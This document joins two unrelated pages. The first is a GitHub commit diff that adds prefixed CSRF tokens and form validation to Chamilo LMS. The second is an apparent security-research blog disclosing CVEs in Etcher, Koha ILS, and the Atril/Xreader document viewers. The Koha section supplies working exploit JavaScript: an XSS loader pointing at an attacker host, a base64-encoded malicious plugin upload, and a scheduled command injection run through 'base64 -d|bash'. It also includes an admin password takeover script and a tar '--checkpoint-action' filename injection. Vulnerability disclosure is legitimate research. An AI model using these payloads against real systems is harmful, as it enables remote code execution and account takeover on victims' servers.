|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand All | | @@ -221,11 +226,12 @@ public static function clear\_token() |
|  |  | \* |
|  |  | \* @return string Hidden-type input ready to insert into a form |
|  |  | \*/ |
|  |  | public static function get\_HTML\_token() |
|  |  | public static function get\_HTML\_token(string $prefix = '') |
|  |  | { |
|  |  | $secTokenVariable = self::generateSecTokenVariable($prefix); |
|  |  | $token = md5(uniqid(rand(), true)); |
|  |  | $string = '<input type="hidden" name="sec\_token" value="'.$token.'" />'; |
|  |  | Session::write('sec\_token', $token); |
|  |  | $string = '<input type="hidden" name="'.$secTokenVariable.'" value="'.$token.'" />'; |
|  |  | Session::write($secTokenVariable, $token); |
|  |  |  |
|  |  | return $string; |
|  |  | } |
| Expand All | | @@ -240,24 +246,26 @@ public static function get\_HTML\_token() |
|  |  | \* |
|  |  | \* @return string Token |
|  |  | \*/ |
|  |  | public static function get\_token() |
|  |  | public static function get\_token($prefix = '') |
|  |  | { |
|  |  | $secTokenVariable = self::generateSecTokenVariable($prefix); |
|  |  | $token = md5(uniqid(rand(), true)); |
|  |  | Session::write('sec\_token', $token); |
|  |  | Session::write($secTokenVariable, $token); |
|  |  |  |
|  |  | return $token; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @return string |
|  |  | \*/ |
|  |  | public static function get\_existing\_token() |
|  |  | public static function get\_existing\_token(string $prefix = '') |
|  |  | { |
|  |  | $token = Session::read('sec\_token'); |
|  |  | $secTokenVariable = self::generateSecTokenVariable($prefix); |
|  |  | $token = Session::read($secTokenVariable); |
|  |  | if (!empty($token)) { |
|  |  | return $token; |
|  |  | } else { |
|  |  | return self::get\_token(); |
|  |  | return self::get\_token($prefix); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -584,4 +592,13 @@ public static function getPasswordRequirementsToString($passedConditions = []) |
|  |  |  |
|  |  | return $output; |
|  |  | } |
|  |  |  |
|  |  | private static function generateSecTokenVariable(string $prefix = ''): string |
|  |  | { |
|  |  | if (empty($prefix)) { |
|  |  | return 'sec\_token'; |
|  |  | } |
|  |  |  |
|  |  | return $prefix.'\_sec\_token'; |
|  |  | } |
|  |  | } |

108 changes: 59 additions & 49 deletions

108
[main/inc/lib/social.lib.php](#diff-007619523dcf9b5a272aa5e884a397f5962130c4765c2ee2d4c4e5c37dc5accf "main/inc/lib/social.lib.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/c75b06adb816565e63f0738c028bd870c49b4de9/main/inc/lib/social.lib.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2404,53 +2404,10 @@ public static function getScriptToGetOpenGraph() |
|  |  | </script>'; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @param string $urlForm |
|  |  | \* |
|  |  | \* @return string |
|  |  | \*/ |
|  |  | public static function getWallForm($urlForm) |
|  |  | public static function displayWallForm(string $urlForm): string |
|  |  | { |
|  |  | $userId = isset($\_GET['u']) ? '?u='.intval($\_GET['u']) : ''; |
|  |  | $form = new FormValidator( |
|  |  | 'social\_wall\_main', |
|  |  | 'post', |
|  |  | $urlForm.$userId, |
|  |  | null, |
|  |  | ['enctype' => 'multipart/form-data'], |
|  |  | FormValidator::LAYOUT\_HORIZONTAL |
|  |  | ); |
|  |  |  |
|  |  | $socialWallPlaceholder = isset($\_GET['u']) ? get\_lang('SocialWallWriteNewPostToFriend') : get\_lang( |
|  |  | 'SocialWallWhatAreYouThinkingAbout' |
|  |  | ); |
|  |  |  |
|  |  | $form->addTextarea( |
|  |  | 'social\_wall\_new\_msg\_main', |
|  |  | null, |
|  |  | [ |
|  |  | 'placeholder' => $socialWallPlaceholder, |
|  |  | 'cols-size' => [1, 12, 1], |
|  |  | 'aria-label' => $socialWallPlaceholder, |
|  |  | ] |
|  |  | ); |
|  |  | $form->addHtml('<div class="form-group">'); |
|  |  | $form->addHtml('<div class="col-sm-6">'); |
|  |  | $form->addFile('picture', get\_lang('UploadFile'), ['custom' => true]); |
|  |  | $form->addHtml('</div>'); |
|  |  | $form->addHtml('<div class="col-sm-6 "><div class="pull-right">'); |
|  |  | $form->addButtonSend( |
|  |  | get\_lang('Post'), |
|  |  | 'wall\_post\_button', |
|  |  | false, |
|  |  | [ |
|  |  | 'cols-size' => [1, 10, 1], |
|  |  | 'custom' => true, |
|  |  | ] |
|  |  | ); |
|  |  | $form->addHtml('</div></div>'); |
|  |  | $form->addHtml('</div>'); |
|  |  | $form->addHidden('url\_content', ''); |
|  |  | $form = self::getWallForm($urlForm); |
|  |  | $form->protect(); |
|  |  |  |
|  |  | return Display::panel($form->returnForm(), get\_lang('SocialWall')); |
|  |  | } |
| Expand Down  Expand Up | | @@ -2989,12 +2946,19 @@ public static function handlePosts($url) |
|  |  | { |
|  |  | $friendId = isset($\_GET['u']) ? (int) $\_GET['u'] : api\_get\_user\_id(); |
|  |  | $url = Security::remove\_XSS($url); |
|  |  | $wallSocialAddPost = SocialManager::getWallForm(api\_get\_self()); |
|  |  |  |
|  |  | if (!$wallSocialAddPost->validate()) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | $values = $wallSocialAddPost->exportValues(); |
|  |  |  |
|  |  | // Main post |
|  |  | if (!empty($\_POST['social\_wall\_new\_msg\_main']) || !empty($\_FILES['picture']['tmp\_name'])) { |
|  |  | $messageContent = $\_POST['social\_wall\_new\_msg\_main']; |
|  |  | if (!empty($values['social\_wall\_new\_msg\_main']) || !empty($\_FILES['picture']['tmp\_name'])) { |
|  |  | $messageContent = $values['social\_wall\_new\_msg\_main']; |
|  |  | if (!empty($\_POST['url\_content'])) { |
|  |  | $messageContent = $\_POST['social\_wall\_new\_msg\_main'].'<br /><br />'.$\_POST['url\_content']; |
|  |  | $messageContent = $values['social\_wall\_new\_msg\_main'].'<br /><br />'.$values['url\_content']; |
|  |  | } |
|  |  |  |
|  |  | $messageId = self::sendWallMessage( |
| Expand Down  Expand Up | | @@ -3407,6 +3371,52 @@ public static function getHomeProfileTabs($selected = 'home') |
|  |  | return $tabs; |
|  |  | } |
|  |  |  |
|  |  | private static function getWallForm(string $urlForm): FormValidator |
|  |  | { |
|  |  | $userId = isset($\_GET['u']) ? '?u='.((int) $\_GET['u']) : ''; |
|  |  | $form = new FormValidator( |
|  |  | 'social\_wall\_main', |
|  |  | 'post', |
|  |  | $urlForm.$userId, |
|  |  | null, |
|  |  | ['enctype' => 'multipart/form-data'], |
|  |  | FormValidator::LAYOUT\_HORIZONTAL |
|  |  | ); |
|  |  |  |
|  |  | $socialWallPlaceholder = isset($\_GET['u']) |
|  |  | ? get\_lang('SocialWallWriteNewPostToFriend') |
|  |  | : get\_lang('SocialWallWhatAreYouThinkingAbout'); |
|  |  |  |
|  |  | $form->addTextarea( |
|  |  | 'social\_wall\_new\_msg\_main', |
|  |  | null, |
|  |  | [ |
|  |  | 'placeholder' => $socialWallPlaceholder, |
|  |  | 'cols-size' => [1, 12, 1], |
|  |  | 'aria-label' => $socialWallPlaceholder, |
|  |  | ] |
|  |  | ); |
|  |  | $form->addHtml('<div class="form-group">'); |
|  |  | $form->addHtml('<div class="col-sm-6">'); |
|  |  | $form->addFile('picture', get\_lang('UploadFile'), ['custom' => true]); |
|  |  | $form->addHtml('</div>'); |
|  |  | $form->addHtml('<div class="col-sm-6 "><div class="pull-right">'); |
|  |  | $form->addButtonSend( |
|  |  | get\_lang('Post'), |
|  |  | 'wall\_post\_button', |
|  |  | false, |
|  |  | [ |
|  |  | 'cols-size' => [1, 10, 1], |
|  |  | 'custom' => true, |
|  |  | ] |
|  |  | ); |
|  |  | $form->addHtml('</div></div>'); |
|  |  | $form->addHtml('</div>'); |
|  |  | $form->addHidden('url\_content', ''); |
|  |  |  |
|  |  | return $form; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Returns the formatted header message post. |
|  |  | \* |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[main/social/home.php](#diff-6c2dbcf81cbf5d4aae5690663204c4ca9569d42cd5a181a64bd15187dfca8f2b "main/social/home.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/c75b06adb816565e63f0738c028bd870c49b4de9/main/social/home.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -99,7 +99,7 @@ |
|  |  | $friend\_html = SocialManager::listMyFriendsBlock($user\_id); |
|  |  |  |
|  |  | // Block Social Sessions |
|  |  | $wallSocialAddPost = SocialManager::getWallForm(api\_get\_self()); |
|  |  | $wallSocialAddPost = SocialManager::displayWallForm(api\_get\_self()); |
|  |  | $socialAutoExtendLink = SocialManager::getAutoExtendLink($user\_id, $countPost); |
|  |  |  |
|  |  | $formSearch = new FormValidator( |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[main/social/profile.php](#diff-5b04a72120510239ee70b95293c1388087a5d96124633cbe29754da386d897f9 "main/social/profile.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/c75b06adb816565e63f0738c028bd870c49b4de9/main/social/profile.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -141,7 +141,7 @@ |
|  |  |  |
|  |  | // My friends |
|  |  | $friend\_html = SocialManager::listMyFriendsBlock($user\_id, $link\_shared); |
|  |  | $addPostForm = SocialManager::getWallForm(api\_get\_self()); |
|  |  | $addPostForm = SocialManager::displayWallForm(api\_get\_self()); |
|  |  | $addPostFormPortfolio = SocialManager::getWallFormPortfolio(api\_get\_self()); |
|  |  |  |
|  |  | $posts = SocialManager::getWallMessagesByUser($friendId); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c75b06a`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fcommit%2Fc75b06adb816565e63f0738c028bd870c49b4de) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from febin0x4e4a.wordpress.com_42948c5d_20250115_193556.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# Uncategorized

# [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)

[22nd August 202422nd August 2024](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/08/etcher.webp?w=1024)

Local Privilege Escalation Vulnerability in Balena Etcher software in Ubuntu/Debian due to a race-condition issue.

Severity: **Medium**

Etcher is a popular cross-platform tool from balena.io to flash OS images onto SD cards and USB drives safely and easily. It is one of the most-popular USB flashing tools.

A Local Privilege Escalation flaw has been discovered in the latest version of Etcher <= v1.18.11 that allows an attacker with a low-privileged user account to create a directory named “etcher”
under /tmp, when the Admin user runs Etcher in his session, the attacker can achieve LPE.

This vulnerability arises due to the fact that, when someone runs Etcher, it creates a temporary directory under /tmp and writes a file under /tmp/etcher and the file will look something like “balena-etcher-electron-[random-uuid].cmd. Etcher then prompts for root/admin password, when admin enters the password, it then calls /tmp/etcher/balena-etcher-electron-[random-uuid].cmd and executes it with root privileges. Etcher then deletes the file and /tmp/etcher will be removed after a system reboot.

An attacker with a low-priv user account can exploit this behavior by creating his own /tmp/etcher directory, when the admin or any other user runs Etcher, it will write balena-etcher-electron-.cmd under attacker-owned /tmp/etcher directory.
The Attacker may not directly overwrite the file /tmp/etcher/balena-etcher-electron-[random-uuid].cmd because the file is created and owned by the admin or the user who ran Etcher, the attacker can just delete the /tmp/etcher directory as he is the owner of the directory and then he can again create /tmp/etcher directory and create a file that has exactly the same name as the file “balena-etcher-electron-[random-uuid].cmd” which is created by Etcher before. Etcher will then run the attacker’s malicious commands instead of the actual commands that are supposed to run.

Etcher creates the file before the password prompt and runs after the user enters the root/admin password, this is where the Race-Condition happens, attacker can create an automated script that creates /tmp/etcher and monitors it constantly, if a file is being created under /tmp/etcher it immediately deletes the directory and creates a fake /tmp/etcher/balena-etcher-electron-[random-uuid].cmd.

Limitation: The only limitation of the exploit is that while running the exploit, if there’s already /tmp/etcher present that means someone already ran Etcher Software before the exploit, a system reboot is required i.e., if there’s already a /tmp/etcher directory is present and that’s not owned by the attacker then the attacker should wait for a reboot.

Demo Scenario:

1. An attacker with a low privileged user (low-priv) access to the target.

2. Admin privileged user running etcher (adminuser) in Ubuntu.

Demo video: <https://github.com/febin0x10/etcher_privesc_exploit/raw/main/Etcher_privilege_escalation_linux_by_Febin.mp4>

Download Exploit: <https://github.com/febin0x10/etcher_privesc_exploit.git>

Software Information:

Etcher is a popular SD card flasher app that is simple for end users, extensible for developers, and works on any platform.

Official Website: <https://etcher.balena.io/>
Github Repo: <https://github.com/balena-io/etcher>
Download Vulnerable version(.deb): <https://github.com/balena-io/etcher/releases/download/v1.18.11/balena-etcher_1.18.11_amd64.deb>

Update Etcher to its latest version!

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

